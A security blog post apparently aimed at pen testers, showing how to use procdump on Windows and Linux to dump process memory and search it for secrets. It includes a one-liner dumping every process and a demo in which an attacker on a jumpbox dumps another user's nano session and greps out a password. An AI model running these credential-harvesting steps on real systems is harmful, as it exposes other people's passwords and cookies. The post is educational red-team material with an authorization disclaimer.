# Aug 09 Using procdump on Linux to dump credentials

Posted on Aug 9, 2021

Tags: [#tools](https://embracethered.com/blog/tags/tools) [#red](https://embracethered.com/blog/tags/red)

I like using `procdump` on Windows.

It’s quite handy for software development when systems have memory leaks or performance issues — `procdump` allows setting thresholds to trigger creation of a core dump.

BUT, it’s also super useful to search processes for secrets and other information.

For instance, this one-liner will dump the memory of all processes to disk and then you can search them as you see fit:

```powershell
Get-Process | % { procdump.exe -ma $_.Id }
```

This is not the most elegant way of course, but I have found this extremely useful at times.

This post is solely focused on `procdump`, so I wanted to highlight that there is another useful tool on Windows called [Mimikittenz](https://github.com/putterpanda/mimikittenz), which utilizes `ReadProcessMemory` to search process memory without creating a file on disk. But, let’s focus on procdump and Linux!

## Procdump on Linux!

`procdump` has also been available on Linux for some time now, although it has not gotten as much attention from the security community and pen testers.

![procdump in action](../../.gitbook/assets/procdump.gif)

In this post I want to highlight some examples of how to use it on Linux to improve your pen testing skills.

## Installation

On Ubuntu the Microsoft keys are not trusted by default, so you can either manually build the project or download and trust Microsoft’s keys, and then use `sudo apt` to install. Detailed instructions for various platforms are located [here](https://github.com/Sysinternals/ProcDump-for-Linux/blob/master/INSTALL.md).

### Installing Microsoft’s key on Ubuntu

```bash
wget -q https://packages.microsoft.com/config/ubuntu/$(lsb_release -rs)/packages-microsoft-prod.deb -O packages-microsoft-prod.deb sudo dpkg -i packages-microsoft-prod.deb
```

### Installing `procdump`

```bash
sudo apt-get update sudo apt-get install procdump
```

### Building `procdump` from scratch

For pen testing the preferred option (if the tool is not yet available) is to build it from scratch. Instructions can be found on `procdump`’s GitHub repo: https://github.com/Sysinternals/ProcDump-for-Linux/blob/master/INSTALL.md

## Basic usage and features

When invoking `procdump` specify the `PID` and the tool will do its magic to create a core memory dump:

```bash
sudo procdump -o /tmp -p 27390
```

Above I also specified `-o` to write the dump to a specific folder.

Most features are useful for debugging performance and memory leak issues. For instance, it’s possible to dump the memory when the CPU is under a certain load and so on. These features are less interesting for red teamers’ nefarious purposes.

It’s also possible to use the image name instead of the `PID` with the `-w` option, for example:

```bash
sudo procdump -w firefox
```

This will write a core memory dump of the browser to the hard drive, and afterwards one can go credential hunting and look for passwords and cookies inside it.

## Demo Scenario

Let’s say the malicious engineer wants to see what another user is up to on a Jumpbox.

The attacker already pivoted onto that host and now is inspecting the processes and notices that user Bob is working in `nano`.

{% stepper %}
{% step %}
### Attacker uses procdump on Bob’s nano process

```bash
sudo procdump -w nano
```

This is how the output looks like:
{% endstep %}

{% step %}
### Attacker searches the core memory dump for interesting information

The next step is to analyze the memory dump. Do a simple string search and grep:

```bash
~$ strings nano_time_2021-08-09_10\:23\:42.3197 | grep password
password="
password=helloWorld!
```

Screenshot of the procedure:

After getting a hold of the process memory, you can use `grep`, `strings` or tools like [Silver Searcher](/broken/pages/938b29d35b4b9a1eb29c172f7a93b995666e1e26) to search through the core dump files.
{% endstep %}

{% step %}
### What did Bob work on at that moment?

As a reference, this is how Bob’s session looked like at that point. He was working in `nano`, using it as a scratchpad for passwords, which he does not store onto disk.

Many developers and engineers do exactly as Bob did: using ephemeral, non-persistent notepad files to temporarily hold credentials.
{% endstep %}
{% endstepper %}

## Conclusion

`procdump` is quite neat and useful. Hope this mini-intro was helpful to learn more about `procdump` and its existence on Linux.

Cheers, [@wunderwuzzi23](https://twitter.com/wunderwuzzi23)

## References

* https://github.com/microsoft/procdump-for-linux
* https://github.com/putterpanda/mimikittenz

***

Contact: mailto:security@wunderwuzzi.net

(c) WUNDERWUZZI 2018-2025

Disclaimer: Penetration testing requires authorization from proper stakeholders. Information on this blog is provided for research and educational purposes to advance understanding of attacks and countermeasures to help secure the Internet.

![tracker](https://wuzzi.net/anamato/inc/rts.php?idsite=1\&rec=1)
